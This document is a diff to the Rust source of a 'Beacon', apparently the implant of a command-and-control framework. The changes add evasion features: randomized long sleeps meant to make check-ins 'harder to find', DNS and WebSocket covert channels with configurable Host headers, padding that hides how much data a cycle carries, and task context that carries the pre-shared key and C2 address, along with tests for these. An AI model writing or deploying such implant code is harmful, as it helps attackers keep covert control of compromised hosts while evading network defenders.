@@ -72,7 +72,14 @@ impl Beacon {
         (base * factor).min(300)
     }
 
-    /// Sleep interval with jitter: uniform in [sleep*(1-j), sleep*(1+j)].
+    /// Sleep interval with jitter and obfuscation.
+    ///
+    /// The jitter spreads the check-ins around the configured interval:
+    /// uniform in [sleep*(1-j), sleep*(1+j)].  The obfuscation adds an
+    /// occasional long nap on top of it, because a uniform distribution is a
+    /// signature of its own -- a beacon that checks in every 60.4 seconds on
+    /// average is easier to find than one that sometimes sleeps for three
+    /// minutes.
     fn next_interval(&self) -> u64 {
         let base = self.cfg.sleep.max(1) as f64;
         let j = (self.cfg.jitter.min(90) as f64) / 100.0;
@@ -80,7 +87,14 @@ impl Beacon {
         let hi = (base * (1.0 + j)).max(lo);
         let span = hi - lo;
         let r = random_unit();
-        (lo + span * r) as u64
+        let mut interval = (lo + span * r) as u64;
+        if self.cfg.sleep_obfuscate && random_unit() < 0.25 {
+            // One check-in in four takes a long nap: 1.5 to 3.5 times the
+            // jittered interval.
+            let factor = 1.5 + 2.0 * random_unit();
+            interval = ((interval as f64) * factor) as u64;
+        }
+        interval.max(1)
     }
 
     fn open_channel(&mut self) -> Result<(), String> {
@@ -91,8 +105,28 @@ impl Beacon {
                 Box::new(c)
             }
             Transport::Http => Box::new(
-                HttpChannel::new(&self.cfg.server, &self.cfg.http_path)
-                    .map_err(|e| format!("http channel: {e}"))?,
+                HttpChannel::new(
+                    &self.cfg.server,
+                    &self.cfg.http_path,
+                    &self.cfg.http_host_header,
+                )
+                .map_err(|e| format!("http channel: {e}"))?,
+            ),
+            Transport::Dns => Box::new(
+                crate::dns::DnsChannel::new(
+                    &self.cfg.dns_resolver,
+                    &self.cfg.dns_domain,
+                    &self.cfg.agent_id,
+                )
+                .map_err(|e| format!("dns channel: {e}"))?,
+            ),
+            Transport::Ws => Box::new(
+                crate::ws::WsChannel::new(
+                    &self.cfg.server,
+                    &self.cfg.ws_path,
+                    &self.cfg.ws_host_header,
+                )
+                .map_err(|e| format!("websocket channel: {e}"))?,
             ),
         };
         self.channel = Some(ch);
@@ -104,6 +138,9 @@ impl Beacon {
         self.open_channel()?;
         self.handshake()?;
         let keep_running = self.cycle()?;
+        // Traffic padding: the last request of a cycle is padded to a bucket
+        // size, so its length does not tell how much work the cycle carried.
+        self.pad_pending()?;
         if let Some(ch) = self.channel.as_mut() {
             let _ = ch.flush();
             ch.close();
@@ -113,100 +150,77 @@ impl Beacon {
         Ok(keep_running)
     }
 
+    /// Pad the pending request to a bucket size.
+    ///
+    /// The padding is a sealed PADDING frame with a random body: the server
+    /// ignores it, and only the length of the request becomes uniform.  The
+    /// size of the frame depends on the length prefix of its body, so the
+    /// body length is solved for instead of guessed.
+    fn pad_pending(&mut self) -> Result<(), String> {
+        let bucket = self.cfg.http_pad as usize;
+        if bucket == 0 {
+            return Ok(());
+        }
+        let pending = match self.channel.as_mut() {
+            Some(ch) => ch.pending_len(),
+            None => 0,
+        };
+        if pending == 0 {
+            return Ok(());
+        }
+        // The fixed part of a frame: prelude, nonce, the upk tag of the body
+        // and the authentication tag.
+        let overhead = wire::HEADER_LEN + wire::TAG_LEN + 1;
+        let target = (pending + overhead + bucket - 1) / bucket * bucket;
+        for prefix in 1..=3usize {
+            let length = target as isize - pending as isize - overhead as isize - prefix as isize;
+            if length < 0 {
+                continue;
+            }
+            let length = length as usize;
+            if uvarint_len(length as u64) != prefix {
+                continue;
+            }
+            let body = crate::crypto::random_bytes(length);
+            let value = upk::Value::Bin(body);
+            let frame = self.seal(wire::MSG_PADDING, &value)?;
+            if pending + frame.len() != target {
+                self.log("the padding did not reach the bucket");
+            }
+            self.write(&frame)?;
+            return Ok(());
+        }
+        Ok(())
+    }
+
     // -- handshake -------------------------------------------------------
+    /// The handshake is the shared client half of the protocol; the pivot
+    /// callback uses the very same code, so the two can never drift apart.
     fn handshake(&mut self) -> Result<(), String> {
         let suites = crypto::supported_suites();
         let suite = *suites.first().ok_or("no AEAD suite compiled in")?;
-        let (secret, pubkey) = crypto::x25519_keypair();
-        let cn = crypto::random_bytes(16);
-        let ts = now_secs();
+        let meta = sysinfo::meta(VERSION);
+        let handshake = {
+            let channel = self.channel.as_mut().ok_or("the channel is closed")?;
+            crate::link::client_handshake(
+                channel.as_mut(),
+                &self.cfg.psk,
+                crypto::ROLE_AGENT,
+                &self.cfg.agent_id,
+                suite,
+                meta,
+            )?
+        };
+        let session_id = handshake.session_id.clone();
+        self.session = Some(handshake.session);
 
-        let auth = crypto::hello_auth(
-            &self.cfg.psk,
-            crypto::ROLE_AGENT,
-            self.cfg.agent_id.as_bytes(),
-            &pubkey,
-            &cn,
-            ts,
-            suite,
-        )
-        .map_err(|e| format!("hello auth: {e}"))?;
-
-        let hello = upk::map(vec![
-            ("v", upk::u(1)),
-            ("role", upk::u(crypto::ROLE_AGENT as u64)),
-            ("id", upk::s(&self.cfg.agent_id)),
-            ("pub", upk::bin(&pubkey)),
-            ("cn", upk::bin(&cn)),
-            ("ts", upk::u(ts)),
-            ("suite", upk::u(suite as u64)),
-            ("auth", upk::bin(&auth)),
-            ("meta", sysinfo::meta(VERSION)),
-        ]);
-        let encoded = upk::encode(&hello).map_err(|e| format!("encode hello: {e}"))?;
-        let mut body = Vec::with_capacity(encoded.len() + 1);
-        body.push(wire::MARKER_HELLO);
-        body.extend_from_slice(&encoded);
-
-        let mut boot = Session::from_bootstrap(&self.cfg.psk, suite, false)
-            .map_err(|e| format!("bootstrap session: {e}"))?;
-        let frame = boot.seal(wire::MSG_HELLO, &body).map_err(|e| format!("seal hello: {e}"))?;
-        self.write(&frame)?;
-
-        let resp = self.read()?;
-        let (msg_type, plain) =
-            boot.open(&resp).map_err(|e| format!("open hello_ack: {e}"))?;
-        if msg_type != wire::MSG_HELLO_ACK {
-            return Err(format!("expected HELLO_ACK, got {}", wire::type_name(msg_type)));
-        }
-        if plain.first() != Some(&wire::MARKER_HELLO_ACK) {
-            return Err("bad HELLO_ACK marker".to_string());
-        }
-        let ack = upk::decode_exact(&plain[1..]).map_err(|e| format!("decode hello_ack: {e}"))?;
-
-        let server_pub = ack.bin_or("pub", &[]);
-        let sn = ack.bin_or("sn", &[]);
-        let sid = ack.bin_or("sid", &[]);
-        let neg_suite = ack.u64_or("suite", 0) as u8;
-        if server_pub.len() != 32 || sn.len() != 16 || sid.len() != 16 {
-            return Err("malformed HELLO_ACK fields".to_string());
-        }
-        if neg_suite != suite {
-            return Err("server changed the AEAD suite without negotiation".to_string());
-        }
-
-        let want = crypto::ack_auth(
-            &self.cfg.psk,
-            self.cfg.agent_id.as_bytes(),
-            &pubkey,
-            &server_pub,
-            &cn,
-            &sn,
-            &sid,
-            neg_suite,
-        )
-        .map_err(|e| format!("ack auth: {e}"))?;
-        let got = ack.bin_or("auth", &[]);
-        if !ct_eq(&want, &got) {
-            return Err("server authentication failed (wrong PSK?)".to_string());
-        }
-
-        let shared = crypto::x25519_shared(&secret, &server_pub)
-            .map_err(|e| format!("x25519: {e}"))?;
-        let (prk, km) = crypto::derive_session(&shared, &cn, &sn)
-            .map_err(|e| format!("derive session: {e}"))?;
-        self.session = Some(
-            Session::new(neg_suite, km, false, false, Some(prk))
-                .map_err(|e| format!("session: {e}"))?,
-        );
-
-        if let Some(cfg) = ack.get("cfg") {
+        if let Some(cfg) = handshake.ack.get("cfg") {
             let sleep = cfg.u64_or("sleep", self.cfg.sleep);
             let jitter = cfg.u64_or("jitter", self.cfg.jitter as u64) as u32;
             self.apply_policy(sleep, jitter);
         }
         if let Some(ch) = self.channel.as_mut() {
-            ch.set_session_id(&crate::config::hex_encode(&sid));
+            ch.set_session_id(&crate::config::hex_encode(&session_id));
         }
         self.log("handshake complete");
         Ok(())
@@ -218,6 +232,16 @@ impl Beacon {
         }
         if jitter <= 90 {
             self.cfg.jitter = jitter;
+        }
+    }
+
+    /// The context the tasks get: identity, key and C2 address.
+    fn context(&self) -> task::Context {
+        task::Context {
+            psk: self.cfg.psk.clone(),
+            agent_id: self.cfg.agent_id.clone(),
+            server: self.cfg.server.clone(),
+            verbose: self.cfg.verbose,
         }
     }
 
@@ -272,6 +296,10 @@ impl Beacon {
                     self.log("server sent KILL");
                     return Ok(false);
                 }
+                wire::MSG_PADDING => {
+                    // Padding frames carry random bytes and are ignored: they
+                    // only make the traffic shape uniform.
+                }
                 other => {
                     return Err(format!("expected TASK_BATCH, got {}", wire::type_name(other)))
                 }
@@ -305,7 +333,7 @@ impl Beacon {
 
             match kind.as_str() {
                 "exit" | "kill" => {
-                    let outcome = task::run(&kind, &args);
+                    let outcome = task::run(&self.context(), &kind, &args);
                     self.send_result(&id, &outcome)?;
                     self.send_bye()?;
                     return Ok(false);
@@ -314,11 +342,11 @@ impl Beacon {
                     let sleep = args.u64_or("sleep", self.cfg.sleep);
                     let jitter = args.u64_or("jitter", self.cfg.jitter as u64) as u32;
                     self.apply_policy(sleep, jitter);
-                    let outcome = task::run("sleep", &args);
+                    let outcome = task::run(&self.context(), "sleep", &args);
                     self.send_result(&id, &outcome)?;
                 }
                 _ => {
-                    let outcome = task::run(&kind, &args);
+                    let outcome = task::run(&self.context(), &kind, &args);
                     self.send_result(&id, &outcome)?;
                 }
             }
@@ -396,6 +424,17 @@ pub fn ct_eq(a: &[u8], b: &[u8]) -> bool {
     diff == 0
 }
 
+/// The number of bytes an uvarint of n occupies.
+fn uvarint_len(n: u64) -> usize {
+    let mut size = 1;
+    let mut value = n;
+    while value >= 0x80 {
+        value >>= 7;
+        size += 1;
+    }
+    size
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -405,6 +444,39 @@ mod tests {
         assert!(ct_eq(b"abc", b"abc"));
         assert!(!ct_eq(b"abc", b"abd"));
         assert!(!ct_eq(b"abc", b"ab"));
+    }
+
+    #[test]
+    fn the_sleep_is_obfuscated() {
+        let mut cfg = Config {
+            server: "127.0.0.1:1".into(),
+            transport: Transport::Tcp,
+            http_path: "/api/v1/beacon".into(),
+            agent_id: "test".into(),
+            psk: vec![1u8; 32],
+            sleep: 100,
+            jitter: 20,
+            verbose: false,
+            dns_resolver: "127.0.0.1:5353".into(),
+            dns_domain: "umbra.local".into(),
+            ws_path: "/api/v1/beacon".into(),
+            ws_host_header: String::new(),
+            http_host_header: String::new(),
+            http_pad: 0,
+            sleep_obfuscate: true,
+        };
+        let b = Beacon::new(cfg);
+        let mut long = 0;
+        for _ in 0..200 {
+            let v = b.next_interval();
+            assert!(v >= 1, "interval {v} is not positive");
+            if v > 120 {
+                long += 1;
+            }
+        }
+        // The obfuscation has to show up, otherwise it does nothing.
+        assert!(long > 0, "the sleep was never obfuscated");
+        assert!(long < 200, "every check-in was obfuscated");
     }
 
     #[test]
@@ -418,6 +490,13 @@ mod tests {
             sleep: 100,
             jitter: 20,
             verbose: false,
+            dns_resolver: "127.0.0.1:5353".into(),
+            dns_domain: "umbra.local".into(),
+            ws_path: "/api/v1/beacon".into(),
+            ws_host_header: String::new(),
+            http_host_header: String::new(),
+            http_pad: 0,
+            sleep_obfuscate: false,
         };
         cfg.sleep = 100;
         let b = Beacon::new(cfg);
